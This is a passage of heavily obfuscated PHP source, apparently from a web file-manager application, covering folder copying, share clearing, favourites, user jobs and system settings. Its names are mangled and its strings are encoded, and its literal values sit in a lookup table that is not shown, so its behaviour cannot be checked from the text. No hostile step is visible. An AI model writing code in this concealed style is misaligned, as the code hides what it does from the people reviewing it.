$ãÔËº‚Ì[$Ûş¨·ŠÊ[589]], $Ûş¨·ŠÊ[673] => USER_ID, $Ûş¨·ŠÊ[509] => $àÕ×ìõØ); $õî«®ıä = $»À¿ÇÙ[$Ûş¨·ŠÊ[188]] == SourceModel::TYPE_GROUP && $ãÔËº‚Ì[$Ûş¨·ŠÊ[188]] == SourceModel::TYPE_GROUP && $»À¿ÇÙ[$Ûş¨·ŠÊ[589]] == $ãÔËº‚Ì[$Ûş¨·ŠÊ[589]]; if (!$õî«®ıä && $this->moveClearAuth) { Model($Ûş¨·ŠÊ[587])->authClear($ãğ…åÓá); } $Õ¼ıçğâ = $»À¿ÇÙ[$Ûş¨·ŠÊ[520]] == $Ûş¨·ŠÊ[91] && $ãÔËº‚Ì[$Ûş¨·ŠÊ[520]] != $Ûş¨·ŠÊ[91]; if ($Õ¼ıçğâ) { $¢£û™úè[$Ûş¨·ŠÊ[519]] = 0; } if ($”Â¹Á¡ş) { $ Ä™Ÿ‹ = array($Ûş¨·ŠÊ[674] => array($Ûş¨·ŠÊ[635], $»À¿ÇÙ[$Ûş¨·ŠÊ[604]] . $»À¿ÇÙ[$Ûş¨·ŠÊ[191]] . $Ûş¨·ŠÊ[636])); $«äú÷³ = $»À¿ÇÙ[$Ûş¨·ŠÊ[604]] . $»À¿ÇÙ[$Ûş¨·ŠÊ[191]] . $Ûş¨·ŠÊ[50]; $Šª·”®â = $ãÔËº‚Ì[$Ûş¨·ŠÊ[604]] . $ãÔËº‚Ì[$Ûş¨·ŠÊ[191]] . $Ûş¨·ŠÊ[50] . $»À¿ÇÙ[$Ûş¨·ŠÊ[191]] . $Ûş¨·ŠÊ[50]; $á¨æÚç£ = array($Ûş¨·ŠÊ[674] => array($Ûş¨·ŠÊ[683], "\x72\x65\x70\x6c\141\x63\145\50\x70\141\162\x65\x6e\x74\114\145\x76\145\154\x2c\47{$«äú÷³}\47\54\47{$Šª·”®â}\47\51"), $Ûş¨·ŠÊ[670] => $ãÔËº‚Ì[$Ûş¨·ŠÊ[188]], $Ûş¨·ŠÊ[671] => $ãÔËº‚Ì[$Ûş¨·ŠÊ[589]]); if ($Õ¼ıçğâ) { $á¨æÚç£[$Ûş¨·ŠÊ[519]] = 0; } $this->where($ Ä™Ÿ‹)->data($á¨æÚç£)->save(); } $this->where(array($Ûş¨·ŠÊ[506] => $ãğ…åÓá))->data($¢£û™úè)->save(); return $ãğ…åÓá; } private function clearShare($˜Íà²Ñ¡, $œ‹Ëæ¾±) { $Ù½Â¸áå =& $_SERVER[µÅ˜º…æ]; $óèªÕ…ğ = $this->sourceInfo($˜Íà²Ñ¡); $›à¸áÜ = $this->sourceInfo($œ‹Ëæ¾±); if ($óèªÕ…ğ[$Ù½Â¸áå[589]] == $›à¸áÜ[$Ù½Â¸áå[589]] && $óèªÕ…ğ[$Ù½Â¸áå[188]] == $Ù½Â¸áå[684]) { return; } $Õ­Ã±ä = array($Ù½Â¸áå[604] => array($Ù½Â¸áå[635], $óèªÕ…ğ[$Ù½Â¸áå[604]] . $˜Íà²Ñ¡ . $Ù½Â¸áå[636])); $â§—êäŒ = $this->field($Ù½Â¸áå[506])->where($Õ­Ã±ä)->getField($Ù½Â¸áå[191], !0); if (!$â§—êäŒ) { return; } $Õ­Ã±ä = array($Ù½Â¸áå[191] => array($Ù½Â¸áå[7], $â§—êäŒ), $Ù½Â¸áå[685] => 1); $ı“ê×Ò = Model($Ù½Â¸áå[686])->field($Ù½Â¸áå[687])->where($Õ­Ã±ä)->select(); if (!$ı“ê×Ò) { return; } $ı“ê×Ò = array_to_keyvalue($ı“ê×Ò, $Ù½Â¸áå[12], $Ù½Â¸áå[687]); $Õ­Ã±ä = array($Ù½Â¸áå[687] => array($Ù½Â¸áå[7], $ı“ê×Ò)); Model($Ù½Â¸áå[686])->where($Õ­Ã±ä)->save(array($Ù½Â¸áå[685] => 0)); Model($Ù½Â¸áå[688])->where($Õ­Ã±ä)->delete(); } public function copyFolderFromIO($›¢µ±“, $ëŠØšÌ‹, $õ”Ü°¡Ê, $‹¤“Ë™¥, $—·À©ƒÖ, $Ã¬ìŒ®ù = false) { $Á‰ïÛæİ =& $_SERVER[µÅ˜º…æ]; $É’Ùé = array($Á‰ïÛæİ[653] => array(), $Á‰ïÛæİ[654] => array(), $Á‰ïÛæİ[652] => array(), $Á‰ïÛæİ[689] => array()); $‚ª×ïˆ¥ = $Ã¬ìŒ®ù ? $Ã¬ìŒ®ù : $›¢µ±“->pathThis($ëŠØšÌ‹); $¡Ë ³ßÉ = $this->fileNameExist($õ”Ü°¡Ê, $‚ª×ïˆ¥); $¨Ò¯Ã½» = $this->mkdir($õ”Ü°¡Ê, $‚ª×ïˆ¥, $‹¤“Ë™¥); if (!$¡Ë ³ßÉ || $‹¤“Ë™¥ == REPEAT_RENAME_FOLDER) { $‹¤“Ë™¥ = !1; } if ($¡Ë ³ßÉ) { $this->_childrenAllMake($¡Ë ³ßÉ); } Hook::trigger($Á‰ïÛæİ[690]); $á†ïÛ‚Ã = KodIO::ioFileDriverGet($Á‰ïÛæİ[498] . $õ”Ü°¡Ê . $Á‰ïÛæİ[402]); $this->_copyChildTo($›¢µ±“, $ëŠØšÌ‹, $¨Ò¯Ã½», $‹¤“Ë™¥, $É’Ùé, $—·À©ƒÖ, $á†ïÛ‚Ã); Hook::trigger($Á‰ïÛæİ[691]); if ($¨Ò¯Ã½») { $this->folderSizeResetChildren($¨Ò¯Ã½»); } $this->_childrenListClear(); Model($Á‰ïÛæİ[471])->addAll($É’Ùé[$Á‰ïÛæİ[653]], array(), !0); Model($Á‰ïÛæİ[655])->eventCopy($¨Ò¯Ã½»); $this->saveAll($É’Ùé[$Á‰ïÛæİ[654]]); Model($Á‰ïÛæİ[560])->linkAdd($É’Ùé[$Á‰ïÛæİ[652]]); Model($Á‰ïÛæİ[560])->remove($É’Ùé[$Á‰ïÛæİ[689]]); $this->folderSizeReset($õ”Ü°¡Ê); $this->updateModifyTime($õ”Ü°¡Ê); return $¨Ò¯Ã½»; } private function _copyChildTo($£†çáÜ, $ñÍ¿Êì, $ŠûªûÑ‘, $»ÓÚ’¿ , &$×­Î‡İ¨, $ŠÏ «Ó, $ìÛ…ªù†) { $Šâ”’Ë =& $_SERVER[µÅ˜º…æ]; $ĞÈÈ£Ü = $this->sourceInfoCache($ŠûªûÑ‘); $¤ºÇåÂú = $£†çáÜ->listPath($ñÍ¿Êì); $¤ºÇåÂú = $¤ºÇåÂú ? $¤ºÇåÂú : array($Šâ”’Ë[86] => array(), $Šâ”’Ë[85] => array()); $¼ËŠ ò  = array_merge($¤ºÇåÂú[$Šâ”’Ë[86]], $¤ºÇåÂú[$Šâ”’Ë[85]]); $³šÊ‡²  = $this->_addFiles($£†çáÜ, $ìÛ…ªù†, $¤ºÇåÂú[$Šâ”’Ë[86]], $ŠÏ «Ó); $«ÂùÒ€² = array(); foreach ($¼ËŠ ò  as &$ÇÀŠ«ª) { if (isset($³šÊ‡² [$ÇÀŠ«ª[$Šâ”’Ë[32]]])) { $ÇÀŠ«ª = $³šÊ‡² [$ÇÀŠ«ª[$Šâ”’Ë[32]]]; } $ÇÀŠ«ª[$Šâ”’Ë[500]] = $ÇÀŠ«ª[$Šâ”’Ë[33]] == $Šâ”’Ë[78]; $ÇÀŠ«ª[$Šâ”’Ë[501]] = substr(_get($ÇÀŠ«ª, $Šâ”’Ë[166], $Šâ”’Ë[12]), 0, 10); $ÇÀŠ«ª[$Šâ”’Ë[79]] = _get($ÇÀŠ«ª, $Šâ”’Ë[79], 0); $ÇÀŠ«ª[$Šâ”’Ë[557]] = _get($ÇÀŠ«ª, $Šâ”’Ë[557], 0); if (!isset($ÇÀŠ«ª[$Šâ”’Ë[692]]) && $ÇÀŠ«ª[$Šâ”’Ë[557]]) { $×­Î‡İ¨[$Šâ”’Ë[689]][] = $ÇÀŠ«ª[$Šâ”’Ë[557]]; } if ($»ÓÚ’¿ ) { $Æ†ÆÊÁì = $this->fileNameExistCache($ŠûªûÑ‘, $ÇÀŠ«ª[$Šâ”’Ë[32]]); if ($Æ†ÆÊÁì) { if ($ÇÀŠ«ª[$Šâ”’Ë[500]] || $»ÓÚ’¿  == REPEAT_SKIP) { continue; } if ($»ÓÚ’¿  == REPEAT_REPLACE) { $×óäãÄ¡ = $this->sourceInfoCache($Æ†ÆÊÁì); $Ü¨º­æ = $this->fileHistory($×óäãÄ¡, $ÇÀŠ«ª[$Šâ”’Ë[557]], $ÇÀŠ«ª[$Šâ”’Ë[79]]); if ($Ü¨º­æ) { $×­Î‡İ¨[$Šâ”’Ë[652]][] = $ÇÀŠ«ª[$Šâ”’Ë[557]]; } continue; } else { if ($»ÓÚ’¿  == REPEAT_RENAME) { $ÇÀŠ«ª[$Šâ”’Ë[32]] = $this->fileNameAutoCache($ŠûªûÑ‘, $ÇÀŠ«ª[$Šâ”’Ë[32]], $»ÓÚ’¿ , !1); } } } } if (!$ÇÀŠ«ª[$Šâ”’Ë[500]] && $ÇÀŠ«ª[$Šâ”’Ë[557]] == 0) { continue; } if (!$ÇÀŠ«ª[$Šâ”’Ë[500]] && $ÇÀŠ«ª[$Šâ”’Ë[557]]) { $×­Î‡İ¨[$Šâ”’Ë[652]][] = $ÇÀŠ«ª[$Šâ”’Ë[557]]; } $«ÂùÒ€²[] = $this->_makeItemData($ÇÀŠ«ª, $ĞÈÈ£Ü, $ÇÀŠ«ª[$Šâ”’Ë[32]]); } unset($ÇÀŠ«ª); if (!empty($«ÂùÒ€²)) { $this->addAll($«ÂùÒ€²); $this->_childrenListSelect($ŠûªûÑ‘); } $ÖõÙäåù = $this->_childrenList($ŠûªûÑ‘); $ÖõÙäåù = array_to_keyvalue($ÖõÙäåù, $Šâ”’Ë[32]); foreach ($¼ËŠ ò  as $ÇÀŠ«ª) { $×óäãÄ¡ = $ÖõÙäåù[$ÇÀŠ«ª[$Šâ”’Ë[32]]]; $¿Âˆ­Ìâ = $×óäãÄ¡[$Šâ”’Ë[191]]; $this->_copyApplyMeta($×óäãÄ¡, $×­Î‡İ¨); if ($ÇÀŠ«ª[$Šâ”’Ë[33]] == $Šâ”’Ë[78]) { $ÇÀŠ«ª[$Šâ”’Ë[87]] = $£†çáÜ->getPathInner($ÇÀŠ«ª[$Šâ”’Ë[87]]); $this->_copyChildTo($£†çáÜ, $ÇÀŠ«ª[$Šâ”’Ë[87]], $¿Âˆ­Ìâ, $»ÓÚ’¿ , $×­Î‡İ¨, $ŠÏ «Ó, $ìÛ…ªù†); } } } private function _addFiles($½Õòøª«, $…íëÆç, $ËÙúÖŠ, $æõöÖéº) { $Êò™á™© =& $_SERVER[µÅ˜º…æ]; if (!$ËÙúÖŠ || count($ËÙúÖŠ) == 0) { return array(); } $­ŞÜ¨œş = array(); foreach ($ËÙúÖŠ as &$Ç–°ÈÉò) { Hook::trigger($Êò™á™©[693], $Ç–°ÈÉò); $Ç–°ÈÉò[$Êò™á™©[87]] = $½Õòøª«->getPathInner($Ç–°ÈÉò[$Êò™á™©[87]]); $­îŠ’Ç¥ = $½Õòøª«->hashSimple($Ç–°ÈÉò[$Êò™á™©[87]]); $­É¥ÌÜ = $½Õòøª«->hashMd5($Ç–°ÈÉò[$Êò™á™©[87]]); if (strlen($­É¥ÌÜ) > 10 && !isset($­ŞÜ¨œş[$­É¥ÌÜ])) { $­ŞÜ¨œş[$­É¥ÌÜ] = array(); } $Ç–°ÈÉò[$Êò™á™©[694]] = $­îŠ’Ç¥; $Ç–°ÈÉò[$Êò™á™©[563]] = $­É¥ÌÜ; $­ŞÜ¨œş[$­É¥ÌÜ][] =& $Ç–°ÈÉò; if (count($­ŞÜ¨œş[$­É¥ÌÜ]) > 1) { $Ç–°ÈÉò[$Êò™á™©[692]] = !0; } Hook::trigger($Êò™á™©[695], $Ç–°ÈÉò); } unset($Ç–°ÈÉò); $ÀõáÒÔ¢ = array($Êò™á™©[563] => array($Êò™á™©[7], array_keys($­ŞÜ¨œş))); $ü²™ñ´¶ = Model($Êò™á™©[696]); $´Æãùù = $ü²™ñ´¶->where($ÀõáÒÔ¢)->select(); $´Æãùù = $´Æãùù ? $´Æãùù : array(); foreach ($´Æãùù as $òâÔĞÊ˜) { if (!isset($­ŞÜ¨œş[$òâÔĞÊ˜[$Êò™á™©[563]]])) { continue; } $³¨Ãİ•³ = $­ŞÜ¨œş[$òâÔĞÊ˜[$Êò™á™©[563]]]; foreach ($³¨Ãİ•³ as &$Ç–°ÈÉò) { $Ç–°ÈÉò[$Êò™á™©[557]] = $òâÔĞÊ˜[$Êò™á™©[557]]; $Ç–°ÈÉò[$Êò™á™©[692]] = !0; } unset($Ç–°ÈÉò); } $Â¨îşñ = array(); foreach ($ËÙúÖŠ as $ÆĞØùÏÊ) { Hook::trigger($Êò™á™©[697], $ÆĞØùÏÊ); if (isset($ÆĞØùÏÊ[$Êò™á™©[692]]) && $ÆĞØùÏÊ[$Êò™á™©[692]]) { Hook::trigger($Êò™á™©[698], $ÆĞØùÏÊ); continue; } $´ıÓâÙ« = $½Õòøª«->getPathInner($ÆĞØùÏÊ[$Êò™á™©[87]]); $¡’ŞÁáÛ = $ü²™ñ´¶->addFileMake($´ıÓâÙ«, $…íëÆç, $ÆĞØùÏÊ[$Êò™á™©[79]], $ÆĞØùÏÊ[$Êò™á™©[694]], $ÆĞØùÏÊ[$Êò™á™©[563]], $ÆĞØùÏÊ[$Êò™á™©[32]], $æõöÖéº); Hook::trigger($Êò™á™©[698], $ÆĞØùÏÊ); if (!is_array($¡’ŞÁáÛ)) { continue; } $Â¨îşñ[] = $¡’ŞÁáÛ; } $ü²™ñ´¶->addAll($Â¨îşñ); $ÀõáÒÔ¢ = array($Êò™á™©[563] => array($Êò™á™©[7], array_keys($­ŞÜ¨œş))); $´Æãùù = $ü²™ñ´¶->where($ÀõáÒÔ¢)->select(); $´Æãùù = $´Æãùù ? $´Æãùù : array(); foreach ($´Æãùù as $òâÔĞÊ˜) { if (!isset($­ŞÜ¨œş[$òâÔĞÊ˜[$Êò™á™©[563]]])) { continue; } $ƒ„©ÉÕ¶ =& $­ŞÜ¨œş[$òâÔĞÊ˜[$Êò™á™©[563]]]; foreach ($ƒ„©ÉÕ¶ as &$Ç–°ÈÉò) { $Ç–°ÈÉò[$Êò™á™©[557]] = $òâÔĞÊ˜[$Êò™á™©[557]]; } unset($Ç–°ÈÉò); } $Ğ‡ê²Ï£ = array(); foreach ($ËÙúÖŠ as $ ³ËİĞ£) { $Ğ‡ê²Ï£[$ ³ËİĞ£[$Êò™á™©[32]]] = $ ³ËİĞ£; } return $Ğ‡ê²Ï£; } } define($_SERVER[µÅ˜º…æ][699], $_SERVER[µÅ˜º…æ][700]); $tweapokcml = $_SERVER[µÅ˜º…æ][701]; goto dßïƒó®íá; CÔª±††ä“: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\x2e\164\x61\x73\153\114\x69\x73\x74"; public $field = array("\156\141\x6d\x65", "\164\171\x70\x65", "\145\x76\145\156\x74", "\x74\151\x6d\145", "\144\x65\163\143", "\x73\171\163\164\145\x6d", "\x65\x6e\x61\142\x6c\x65", "\154\141\163\164\122\165\156", "\163\157\x72\x74"); public function listData($ôÚ»º = false, $ˆ§‚­œ = "\163\157\x72\x74", $ò¨ñ¿Øî = false) { return parent::listData($ôÚ»º, $ˆ§‚­œ, $ò¨ñ¿Øî); } public function add($¸¼º‚¨”) { $Á¦Ñı‰ó =& $_SERVER[µÅ˜º…æ]; $šèĞ§Ş– = $this->findByName($¸¼º‚¨”[$Á¦Ñı‰ó[32]]); if ($šèĞ§Ş–) { return !1; } $¸¼º‚¨”[$Á¦Ñı‰ó[1927]] = 0; $¸¼º‚¨”[$Á¦Ñı‰ó[2203]] = $this->getSort(); return parent::insert($¸¼º‚¨”); } private function getSort() { $­†¨ç”÷ =& $_SERVER[µÅ˜º…æ]; $°¤úùô˜ = parent::listData(); $òÈ¹È‹ = array_to_keyvalue($°¤úùô˜, $­†¨ç”÷[12], $­†¨ç”÷[2203]); return empty($òÈ¹È‹) ? 0 : max($òÈ¹È‹) + 1; } public function update($µÈ¹—Ÿü, $Æ­¼Ìü) { $¿¢Ôó½— =& $_SERVER[µÅ˜º…æ]; $º°äš—í = $this->listData($µÈ¹—Ÿü); $ùéæµØ = $this->findByName($Æ­¼Ìü[$¿¢Ôó½—[32]]); if (!$º°äš—í || $ùéæµØ && $ùéæµØ[$¿¢Ôó½—[487]] != $º°äš—í[$¿¢Ôó½—[487]]) { return !1; } return parent::update($µÈ¹—Ÿü, $Æ­¼Ìü); } public function remove($éÕãŸ·, $¶ÕšâÀö = false) { $î£‚ëûÃ =& $_SERVER[µÅ˜º…æ]; $ø¬¿·Óú = $this->listData($éÕãŸ·); if (!$ø¬¿·Óú) { return; } if (!$¶ÕšâÀö && $ø¬¿·Óú[$î£‚ëûÃ[189]] == $î£‚ëûÃ[91]) { return !1; } return parent::remove($éÕãŸ·); } public function enable($ìµ¬¡×, $±¬Ë³Âù) { return $this->update($ìµ¬¡×, array($_SERVER[µÅ˜º…æ][2657] => $±¬Ë³Âù)); } public function run($é›²ºñ) { return $this->update($é›²ºñ, array($_SERVER[µÅ˜º…æ][2669] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\x66\x61\166"; protected function cacheFunctionAlias($¤¼áËÊÚ) { $ÊˆÜ¸Ü =& $_SERVER[µÅ˜º…æ]; return array($ÊˆÜ¸Ü[2295] => array(USER_ID, $ÊˆÜ¸Ü[2670])); } protected function ___listData() { $ »ò§¬· =& $_SERVER[µÅ˜º…æ]; $ûïÑ¿¿¢ = array($ »ò§¬·[1967] => USER_ID, $ »ò§¬·[573] => 0); $Ó¦õ¥û = $ »ò§¬·[2671]; $¤ÙÇÃ× = $this->field($Ó¦õ¥û)->where($ûïÑ¿¿¢)->order($ »ò§¬·[2672])->select(); return $¤ÙÇÃ× ? $¤ÙÇÃ× : array(); } protected function resetCache() { } protected function listView() { $­’öâ±ˆ =& $_SERVER[µÅ˜º…æ]; $æ¾ïÙë” = $this->listData(); $œµÒ¥Ï³ = array_filter_by_field($æ¾ïÙë”, $­’öâ±ˆ[33], $­’öâ±ˆ[505]); $ôû¼øò = array_to_keyvalue($œµÒ¥Ï³, $­’öâ±ˆ[12], $­’öâ±ˆ[87]); if (!$ôû¼øò) { return $æ¾ïÙë”; } $›ë£ãÙ = 2000; $íÎ²Ê–• = array($­’öâ±ˆ[506] => array($­’öâ±ˆ[507], $ôû¼øò)); $—¯µš† = Model($­’öâ±ˆ[932])->listSource($íÎ²Ê–•, $›ë£ãÙ); $—¯µš† = array_merge($—¯µš†[$­’öâ±ˆ[86]], $—¯µš†[$­’öâ±ˆ[85]]); $—¯µš† = array_to_keyvalue($—¯µš†, $­’öâ±ˆ[191]); foreach ($æ¾ïÙë” as $¾èåî€Á => $¸ôô€¡Û) { $›šÆÖş² = $—¯µš†[$¸ôô€¡Û[$­’öâ±ˆ[87]]]; $›šÆÖş² = $›šÆÖş² ? $›šÆÖş² : array(); $æ¾ïÙë”[$¾èåî€Á] = array_merge($›šÆÖş², $¸ôô€¡Û); } return $æ¾ïÙë”; } protected function addFav($êáéªÔÈ, $°–­õùË = '', $Èû™ù¶ = "\x73\157\165\x72\143\145") { $ï¨ËÎ =& $_SERVER[µÅ˜º…æ]; $›®ÊÄïÂ = array($ï¨ËÎ[1967] => USER_ID, $ï¨ËÎ[573] => 0, $ï¨ËÎ[511] => $Èû™ù¶, $ï¨ËÎ[510] => $êáéªÔÈ); if ($this->where($›®ÊÄïÂ)->find()) { return !1; } $›®ÊÄïÂ = array($ï¨ËÎ[1967] => USER_ID, $ï¨ËÎ[573] => 0); $˜Ëà¦¥À = $this->where($›®ÊÄïÂ)->max($ï¨ËÎ[2203]); if (!$˜Ëà¦¥À) { $˜Ëà¦¥À = 0; } if (!$°–­õùË && $Èû™ù¶ == $ï¨ËÎ[505]) { $ÂËÄàÊ¤ = Model($ï¨ËÎ[1534])->where(array($ï¨ËÎ[506] => $êáéªÔÈ))->find(); if (!$ÂËÄàÊ¤) { return !1; } $°–­õùË = $ÂËÄàÊ¤[$ï¨ËÎ[32]]; } $°–­õùË = $this->getAutoName($°–­õùË); $À‰ÂšÕÂ = array($ï¨ËÎ[1967] => USER_ID, $ï¨ËÎ[573] => 0, $ï¨ËÎ[509] => $°–­õùË, $ï¨ËÎ[510] => $êáéªÔÈ, $ï¨ËÎ[511] => $Èû™ù¶, $ï¨ËÎ[2185] => $˜Ëà¦¥À + 1); return $this->add($À‰ÂšÕÂ); } protected function remove($ª³ÏÛªƒ) { $Ìüúğ—Ø =& $_SERVER[µÅ˜º…æ]; $Á’¾«°½ = array($Ìüúğ—Ø[1967] => USER_ID, $Ìüúğ—Ø[508] => $ª³ÏÛªƒ); return $this->where($Á’¾«°½)->delete(); } protected function removeByName($ö•°î) { $ñÕªÚ© =& $_SERVER[µÅ˜º…æ]; $ç¿É«‘Ä = array($ñÕªÚ©[1967] => USER_ID, $ñÕªÚ©[509] => $ö•°î, $ñÕªÚ©[573] => 0); return $this->where($ç¿É«‘Ä)->delete(); } protected function rename($ÁµØÓ­¼, $Â²ıì) { $¦Á¾¦Âø =& $_SERVER[µÅ˜º…æ]; if ($ÁµØÓ­¼ == $Â²ıì) { return !1; } $ ×—Ì«‡ = $this->getAutoName($Â²ıì); if ($Â²ıì != $ ×—Ì«‡) { return !1; } $™ºóÆŒÉ = array($¦Á¾¦Âø[1967] => USER_ID, $¦Á¾¦Âø[573] => 0, $¦Á¾¦Âø[32] => $ÁµØÓ­¼); return $this->where($™ºóÆŒÉ)->save(array($¦Á¾¦Âø[32] => $Â²ıì)); } protected function resetSort($©Ô¥ÕƒŸ) { $—•Á´½ =& $_SERVER[µÅ˜º…æ]; $©Ô¥ÕƒŸ = is_array($©Ô¥ÕƒŸ) ? $©Ô¥ÕƒŸ : array(); $û™óİ­» = array($—•Á´½[1967] => USER_ID); for ($Äİ•ì¥ã = 0; $Äİ•ì¥ã < count($©Ô¥ÕƒŸ); $Äİ•ì¥ã++) { $û™óİ­»[$—•Á´½[508]] = $©Ô¥ÕƒŸ[$Äİ•ì¥ã]; $this->where($û™óİ­»)->save(array($—•Á´½[2185] => $Äİ•ì¥ã + 1)); } return !0; } protected function moveTop($Åã¶Šó») { $ù€õñ³¬ =& $_SERVER[µÅ˜º…æ]; $Ãßö‹òË = array($ù€õñ³¬[1967] => USER_ID, $ù€õñ³¬[573] => 0); $Ò³Ìáû‹ = $this->where($Ãßö‹òË)->where(array($ù€õñ³¬[32] => $Åã¶Šó»))->find(); if (!$Ò³Ìáû‹) { return; } $à×ëÈã = $this->field($ù€õñ³¬[487])->where($Ãßö‹òË)->order($ù€õñ³¬[2672])->select(); $à×ëÈã = array_to_keyvalue($à×ëÈã, $ù€õñ³¬[12], $ù€õñ³¬[487]); $á³æ±†¼ = $à×ëÈã; $à×ëÈã = array_remove_value($à×ëÈã, $Ò³Ìáû‹[$ù€õñ³¬[487]]); array_unshift($à×ëÈã, $Ò³Ìáû‹[$ù€õñ³¬[487]]); return $this->resetSort($à×ëÈã); } protected function moveBottom($Š€¥ç™) { $ÉÀı‹ĞÜ =& $_SERVER[µÅ˜º…æ]; $²ì—õ = array($ÉÀı‹ĞÜ[1967] => USER_ID, $ÉÀı‹ĞÜ[573] => 0); $Ö–£ù´Î = $this->where($²ì—õ)->max($ÉÀı‹ĞÜ[2203]); $ôÆŞ¤ú» = array($ÉÀı‹ĞÜ[2203] => $Ö–£ù´Î + 1); return $this->where($²ì—õ)->where(array($ÉÀı‹ĞÜ[32] => $Š€¥ç™))->save($ôÆŞ¤ú»); } private function getAutoName($Æ¨åÖ§Ä) { $‰±ÔËî… =& $_SERVER[µÅ˜º…æ]; $æ½©ÖÒë = array($‰±ÔËî…[1967] => USER_ID, $‰±ÔËî…[573] => 0); $¾„¤Ø¿© = $this->field($‰±ÔËî…[32])->where($æ½©ÖÒë)->select(); $¾„¤Ø¿© = array_to_keyvalue($¾„¤Ø¿©, $‰±ÔËî…[12], $‰±ÔËî…[32]); if (!$¾„¤Ø¿© || !in_array($Æ¨åÖ§Ä, $¾„¤Ø¿©)) { return $Æ¨åÖ§Ä; } for ($ÕÈ‡Ê¿¸ = 0; $ÕÈ‡Ê¿¸ < count($¾„¤Ø¿©); $ÕÈ‡Ê¿¸++) { if (!in_array($Æ¨åÖ§Ä . "\x28{$ÕÈ‡Ê¿¸}\51", $¾„¤Ø¿©)) { return $Æ¨åÖ§Ä . "\50{$ÕÈ‡Ê¿¸}\51"; } } return $Æ¨åÖ§Ä . "\x28{$ÕÈ‡Ê¿¸}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\56\152\157\x62\114\x69\x73\x74"; public $field = array("\156\141\x6d\x65", "\x64\145\x73\143", "\163\x6f\x72\164"); const JOB_KEY = "\x73\145\x6c\146\x4a\x6f\x62\x4c\x69\x73\164"; public function listData($ÊˆäÌô‡ = false, $õĞíšñø = "\x73\157\x72\164", $ûèÖ•¯Ï = false) { return parent::listData($ÊˆäÌô‡, $õĞíšñø, $ûèÖ•¯Ï); } public function remove($ıÚÉ–€Û) { return parent::remove($ıÚÉ–€Û); } public function add($š™Ò¹ü¦) { $Ä²óøÛì =& $_SERVER[µÅ˜º…æ]; if ($this->findByName($š™Ò¹ü¦[$Ä²óøÛì[32]])) { return !1; } $š™Ò¹ü¦[$Ä²óøÛì[2203]] = $this->getSort(); return parent::insert($š™Ò¹ü¦); } private function getSort() { $´„Ñ…‰² =& $_SERVER[µÅ˜º…æ]; $ƒâÉ‡å = parent::listData(); $¤‹©¾¼½ = array_to_keyvalue($ƒâÉ‡å, $´„Ñ…‰²[12], $´„Ñ…‰²[2203]); return empty($¤‹©¾¼½) ? 0 : max($¤‹©¾¼½) + 1; } public function update($³ÕÌ˜¾², $öû·§Ø) { $¹ñ÷ªÈĞ =& $_SERVER[µÅ˜º…æ]; $ˆµ§ƒ¹Û = parent::listData($³ÕÌ˜¾²); $»”Ò¬í = $this->findByName($öû·§Ø[$¹ñ÷ªÈĞ[32]]); if (!$ˆµ§ƒ¹Û || $»”Ò¬í && $»”Ò¬í[$¹ñ÷ªÈĞ[487]] != $ˆµ§ƒ¹Û[$¹ñ÷ªÈĞ[487]]) { return !1; } return parent::update($³ÕÌ˜¾², $öû·§Ø); } public function setUserJob($ñªúæ”¶, $‚³®‚š¦) { $ø‰éÆ¬Ò =& $_SERVER[µÅ˜º…æ]; if (!is_array($‚³®‚š¦)) { $‚³®‚š¦ = array($‚³®‚š¦); } $Á‰ü¨£Ñ = parent::listData(); $ÁÂ”‘ò§ = array_to_keyvalue($Á‰ü¨£Ñ, $ø‰éÆ¬Ò[32]); $ë›¹µ© = $ø‰éÆ¬Ò[463]; foreach ($‚³®‚š¦ as $ÑŒüçì°) { if ($ÁÂ”‘ò§[$ÑŒüçì°]) { $ë›¹µ© .= $ÁÂ”‘ò§[$ÑŒüçì°][$ø‰éÆ¬Ò[487]] . $ø‰éÆ¬Ò[50]; } else { $¦Ç©œö© = $this->add($ÑŒüçì°); $ë›¹µ© .= $¦Ç©œö© . $ø‰éÆ¬Ò[50]; } } $ë›¹µ© = rtrim($ë›¹µ©, $ø‰éÆ¬Ò[50]); Model($ø‰éÆ¬Ò[617])->metaSet($ñªúæ”¶, self::JOB_KEY, $ë›¹µ©); } public function getUserJob($œŠ‡Š´í) { $ÌœäœÏô = Model($_SERVER[µÅ˜º…æ][617])->metaGet($œŠ‡Š´í); return $this->getUserJobInfo($ÌœäœÏô[self::JOB_KEY]); } public function getUserJobInfo($üåş©ü½) { $â‹Şµ€ =& $_SERVER[µÅ˜º…æ]; $¼¸ƒ¾áÙ = explode($â‹Şµ€[50], $üåş©ü½); $ºèîöƒ = parent::listData(); $ºèîöƒ = array_remove_key($ºèîöƒ, $â‹Şµ€[231]); $´Ê½ÍÂÜ = array(); foreach ($¼¸ƒ¾áÙ as $óÍåÔ¡Â) { if (isset($ºèîöƒ[$óÍåÔ¡Â])) { $´Ê½ÍÂÜ[] = $ºèîöƒ[$óÍåÔ¡Â]; } } return $´Ê½ÍÂÜ; } } goto c Ó…Ğ²—; EÑø¾Êå„˜: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\x74\145\x6d\x5f\x6f\160\164\x69\x6f\156"; protected $jsonField = array("\x6d\x65\x6e\165", "\x72\x6f\x6c\145", "\x72\x6f\154\x65\x47\x72\x6f\165\160", "\x72\x65\x67\x69\x73\164", "\145\155\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($õôùô†) { return "\x53\x79\163\x74\x65\x6d\x4f\160\x74\151\x6f\x6e\x5f{$õôùô†}"; } protected function optionDefault($É±Óùç = '') { $Àä€ô¥í =& $_SERVER[µÅ˜º…æ]; if ($É±Óùç == $Àä€ô¥í[12]) { return $GLOBALS[$Àä€ô¥í[6]][$Àä€ô¥í[468]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\x2e\x72\x6f\x6c\145\114\x69\x73\164"; public $field = array("\156\141\155\x65", "\141\x75\164\150", "\154\141\142\x65\x6c", "\x64\x69\163\160\154\141\x79", "\163\171\x73\x74\145\x6d", "\x64\x65\163\143", "\151\x67\x6e\157\162\145\105\170\x74", "\x69\x67\x6e\157\x72\x65\x46\151\x6c\145\x53\x69\172\145", "\x61\x64\x6d\x69\156\x69\163\164\162\x61\x74\x6f\162", "\x73\x6f\x72\x74"); public function listData($ÅŸá¸íô = false, $Ç„€Ì‰” = "\x73\157\162\164", 